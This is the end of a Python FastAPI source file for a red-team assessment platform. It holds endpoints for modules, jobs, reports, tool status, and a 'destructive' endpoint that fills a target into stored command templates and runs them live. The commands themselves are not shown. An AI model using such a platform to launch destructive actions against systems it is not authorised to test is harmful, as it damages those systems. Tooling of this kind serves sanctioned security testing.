<div class="container">
<div class="warning"><strong>⚠️ FULL EXECUTION MODE</strong></div>
<pre style="white-space: pre-wrap;">{escape(markdown)}</pre>
</div>
</body>
</html>"""

# ============ API Endpoints ============
@app.get("/")
def read_index() -> FileResponse:
    return FileResponse(BASE_DIR / "index.html")

@app.get("/styles.css")
def read_styles() -> FileResponse:
    return FileResponse(BASE_DIR / "styles.css")

@app.get("/script.js")
def read_script() -> FileResponse:
    return FileResponse(BASE_DIR / "script.js")

@app.get("/api/health")
def healthcheck() -> dict[str, str]:
    return {"status": "ok", "mode": EXECUTION_MODE, "destructive": DESTRUCTIVE_MODE}

@app.get("/api/config")
def config() -> dict[str, Any]:
    return {
        "allowed_subnets": [str(subnet) for subnet in ALLOWED_SUBNETS],
        "lab_profiles": list(LAB_PROFILES),
        "config_source": LAB_CONFIG_SOURCE,
        "config_path": LAB_CONFIG_PATH,
        "execution_mode": EXECUTION_MODE,
        "destructive_mode": DESTRUCTIVE_MODE,
    }

@app.post("/api/config/reload")
def reload_config() -> dict[str, Any]:
    config_data = load_lab_config()
    apply_lab_config(config_data)
    return {"message": "Configuration reloaded", "config": config()}

@app.post("/api/config/allowed-subnets")
def update_allowed_subnets(payload: ConfigUpdateRequest) -> dict[str, Any]:
    cleaned = [item.strip() for item in payload.allowed_subnets if item.strip()]
    if not cleaned:
        raise HTTPException(status_code=400, detail="Daftar approved ranges tidak boleh kosong.")
    config_data = save_lab_config(allowed_subnets=cleaned, lab_profiles=LAB_PROFILES)
    apply_lab_config(config_data)
    return {"message": "Approved ranges saved", "config": config()}

@app.get("/api/modules")
def modules() -> dict[str, Any]:
    return {"modules": [serialize_module(module) for module in MODULES]}

@app.get("/api/modules/{module_id}/dry-run")
def module_dry_run(module_id: str, target: str, note: str = "", execution_profile: str = "balanced") -> dict[str, Any]:
    validated_target = validate_target(target)
    module = MODULE_BY_ID.get(module_id)
    if not module:
        raise HTTPException(status_code=404, detail="Module not found")
    return {"dry_run": module_dry_run_payload(module, validated_target, note, execution_profile)}

def module_dry_run_payload(module, target: str, note: str, execution_profile: str = "balanced") -> dict[str, Any]:
    profile = normalize_execution_profile(execution_profile)
    return {
        "module_id": module.id,
        "title": module.title,
        "phase_label": module.phase_label,
        "target": target,
        "execution_profile": module_execution_profile(module.id, profile),
        "commands": module_command_preview(module.id, target, profile),
        "tooling": list(module_playbook(module).tooling),
        "allowed_checks": list(module_playbook(module).allowed_checks),
        "notes": list(module.preview),
    }

@app.get("/api/tooling")
def tooling() -> dict[str, Any]:
    return {"tools": [{"label": label, "status": tool_status(label)} for label in TOOL_COMMAND_ALIASES.keys()]}

@app.get("/api/engagements")
def engagements() -> dict[str, Any]:
    return {"engagements": ENGAGEMENTS}

@app.get("/api/findings")
def findings() -> dict[str, Any]:
    return {"findings": FINDINGS}

@app.get("/api/assets")
def list_assets() -> dict[str, Any]:
    return {"assets": [serialize_asset(asset) for asset in ASSETS]}

@app.get("/api/assets/{target}")
def get_asset(target: str) -> dict[str, Any]:
    asset = lookup_asset(target)
    if not asset:
        raise HTTPException(status_code=404, detail="Asset not found")
    return {"asset": asset}

@app.get("/api/jobs")
def list_jobs() -> dict[str, Any]:
    return {"jobs": [hydrate_job(job) for job in JOB_STORE.list_jobs()]}

def hydrate_job(job: dict[str, Any] | None) -> dict[str, Any] | None:
    return reconcile_job_state(job)

@app.get("/api/jobs/{job_id}")
def get_job(job_id: str) -> dict[str, Any]:
    job = hydrate_job(JOB_STORE.get_job(job_id))
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return {"job": job}

@app.post("/api/jobs/{job_id}/stop")
def stop_job(job_id: str) -> dict[str, Any]:
    job = JOB_STORE.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    updated = request_stop_job(job_id)
    if updated is None:
        raise HTTPException(status_code=404, detail="Job not found")
    return {"message": "Stop requested", "job": hydrate_job(updated)}

@app.post("/api/jobs/stop-all")
def stop_all_jobs() -> dict[str, Any]:
    jobs = JOB_STORE.list_jobs()
    active_statuses = {"pending", "running", "stopping"}
    active_jobs = [job for job in jobs if str(job.get("status")) in active_statuses]
    for job in active_jobs:
        request_stop_job(str(job.get("id")), "Bulk stop requested by operator.")
    return {"message": f"Stop requested for {len(active_jobs)} active jobs"}

@app.delete("/api/jobs/{job_id}")
def delete_job(job_id: str) -> dict[str, Any]:
    request_stop_job(job_id, "Delete requested by operator.")
    deleted = JOB_STORE.delete_job(job_id)
    if not deleted:
        raise HTTPException(status_code=404, detail="Job not found")
    return {"message": "Job deleted"}

@app.delete("/api/jobs")
def delete_all_jobs() -> dict[str, Any]:
    for job in JOB_STORE.list_jobs():
        request_stop_job(str(job.get("id")), "Bulk delete requested by operator.")
    deleted = JOB_STORE.delete_all_jobs()
    return {"message": f"{deleted} jobs deleted"}

@app.get("/api/jobs/{job_id}/evidence")
def export_job_evidence(job_id: str) -> JSONResponse:
    job = JOB_STORE.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return JSONResponse(
        content=export_payload(job),
        headers={"Content-Disposition": f'attachment; filename="evidence-{job_id}.json"'}
    )

@app.get("/api/jobs/{job_id}/report.md")
def export_job_report_markdown(job_id: str) -> PlainTextResponse:
    job = JOB_STORE.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return PlainTextResponse(
        content=build_markdown_report(job),
        headers={"Content-Disposition": f'attachment; filename="report-{job_id}.md"'}
    )

@app.get("/api/jobs/{job_id}/report.html")
def export_job_report_html(job_id: str) -> HTMLResponse:
    job = JOB_STORE.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return HTMLResponse(
        content=build_html_report(job),
        headers={"Content-Disposition": f'attachment; filename="report-{job_id}.html"'}
    )

@app.post("/api/imports/parse")
def import_parse(payload: ImportRequest) -> dict[str, Any]:
    target = validate_target(payload.target)
    return {"result": parse_import(payload.tool_name, target, payload.content)}

@app.post("/api/jobs")
def create_module_job(payload: ModuleJobRequest) -> dict[str, Any]:
    if payload.module_id not in MODULE_BY_ID:
        raise HTTPException(status_code=404, detail="Module not found")
    target = validate_target(payload.target)
    module = MODULE_BY_ID[payload.module_id]
    profile = normalize_execution_profile(payload.execution_profile)
    job = create_job("module", module.title, target, payload.note, [module.id], profile)
    return {"job": job}

@app.post("/api/jobs/full-chain")
def create_full_chain_job(payload: JobRequest) -> dict[str, Any]:
    target = validate_target(payload.target)
    job = create_job("chain", f"Full Assessment {target}", target, payload.note, [module.id for module in MODULES], "fast")
    return {"job": job}

@app.post("/api/destructive/execute")
def execute_destructive(payload: DestructiveActionRequest) -> dict[str, Any]:
    target = validate_target(payload.target)
    action_def = DESTRUCTIVE_ACTIONS.get(payload.action)
    if not action_def:
        raise HTTPException(status_code=404, detail="Action not found")
    
    cmd = action_def["command"].replace("{target}", target)
    result = execute_command_with_progress(cmd, "destructive", target, timeout=300)
    
    return {
        "success": result["success"],
        "action": payload.action,
        "target": target,
        "command": cmd,
        "output": result.get("stdout", "")[:2000]
    }

@app.get("/api/destructive/actions")
def list_destructive_actions() -> dict[str, Any]:
    return {"actions": [{"id": aid, **adef} for aid, adef in DESTRUCTIVE_ACTIONS.items()]}

@app.get("/api/tools/status")
def get_tools_status() -> dict[str, Any]:
    statuses = {label: tool_status(label) for label in TOOL_COMMAND_ALIASES.keys()}
    return {
        "tools": statuses,
        "summary": {
            "total": len(statuses),
            "available": sum(1 for s in statuses.values() if s.get("installed") is True),
            "conceptual": sum(1 for s in statuses.values() if s.get("kind") == "conceptual"),
        }
    }

@app.get("/api/tools/check/{tool_name}")
def check_tool(tool_name: str) -> dict[str, Any]:
    if tool_name not in TOOL_COMMAND_ALIASES:
        raise HTTPException(status_code=404, detail="Tool not found")
    return tool_status(tool_name)

# ============ Main Entry ============
if __name__ == "__main__":
    import uvicorn
    print("="*70)
    print("🔥 RED TEAM PLATFORM - FIXED (No NoneType Error)")
    print("="*70)
    print(f"📁 Base: {BASE_DIR}")
    print(f"⚙️  Execution: {EXECUTION_MODE} 🔥 LIVE")
    print(f"⚠️  Destructive: {DESTRUCTIVE_MODE} ✅ FULL")
    print(f"⏱️  Heartbeat: {JOB_HEARTBEAT_TIMEOUT_SECONDS}s")
    print(f"⏱️  Command: {COMMAND_TIMEOUT_SECONDS}s")
    print(f"🌐 Subnets: {', '.join(str(s) for s in ALLOWED_SUBNETS)}")
    print("="*70)
    uvicorn.run(app, host="0.0.0.0", port=8000)
